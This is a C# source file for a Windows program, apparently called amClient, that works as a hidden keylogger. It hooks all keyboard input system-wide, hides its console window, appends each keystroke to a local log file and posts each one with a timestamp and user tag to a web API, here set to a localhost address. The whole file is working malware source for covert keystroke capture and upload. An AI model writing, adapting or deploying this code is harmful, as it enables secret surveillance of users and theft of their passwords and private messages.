using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace amClient
{
    class Program
    {
        #region KeyLogger

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        const int SW_HIDE = 0;

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                sw.Write((Keys)vkCode);
                sw.Close();

                var monitor = new amModel();
                monitor.amModelId = Guid.NewGuid().ToString();
                monitor.KeyLogCatch = ((Keys)vkCode).ToString();
                monitor.TimeStamp = DateTime.Now;
                monitor.userID = "HWK";

                CreateMonitoringAsync(monitor);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        #endregion

        public static void Main()
        {
            var handle = GetConsoleWindow();

            //API
            RunAsync().Wait();

            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        static HttpClient client = new HttpClient();

        static async Task RunAsync()
        {
            // New code:
            client.BaseAddress = new Uri("http://localhost:59302");
            client.DefaultRequestHeaders.Accept.Clear();
            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
        }

        static async Task<amModel> GetMonitoringModelSampleData(string path)
        {
            amModel monitor = null;
            HttpResponseMessage response = await client.GetAsync(path);
            if (response.IsSuccessStatusCode)
            {
                monitor = await response.Content.ReadAsAsync<amModel>();
            }
            return monitor;
        }

        static async Task<Uri> CreateMonitoringAsync(amModel monitor)
        {
            HttpResponseMessage response = await client.PostAsJsonAsync("api/amController", monitor);
            response.EnsureSuccessStatusCode();

            // Return the URI of the created resource.
            return response.Headers.Location;
        }
    }
}
